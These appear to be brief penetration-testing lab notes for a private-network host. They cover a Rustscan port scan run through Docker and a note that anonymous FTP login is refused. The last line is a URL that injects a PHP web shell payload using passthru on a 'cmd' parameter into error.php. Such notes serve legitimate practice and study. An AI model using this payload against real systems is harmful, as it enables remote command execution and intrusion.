# export IP=192.168.243.44

### Rustscan
```
docker run -it --rm --name rustscan rustscan/rustscan:1.10.0 $IP > rust_scan_raw.txt

cat rust_scan_raw.txt | grep -v unknown > rust_scan.txt
```

### FTP
no anonymous login


192.168.243.44/public_html/error.php?<?passthru($_GET[cmd]);?>